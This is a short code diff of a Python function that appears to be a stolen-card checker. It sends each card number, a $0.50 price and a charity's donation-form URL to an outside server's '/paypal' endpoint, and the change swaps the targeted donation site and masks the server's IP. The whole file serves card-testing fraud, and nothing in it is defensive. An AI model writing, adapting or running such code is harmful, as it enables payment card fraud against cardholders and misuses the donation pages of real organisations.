@@ -1,7 +1,8 @@
 import requests
+
 def chkk(ccx):
-	cc=ccx.strip()
-	urll="https://www.northidahowaterpolo.org/donations/donation-form/"
-	price="0.50"
-	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={price}').text
-	return res
+    cc = ccx.strip()
+    url1 = "https://act.dsausa.org"
+    price = "0.50"
+    res = requests.get(f"http://<server>:5500/paypal?cc={cc}&url={url1}&price={price}").text
+    return res
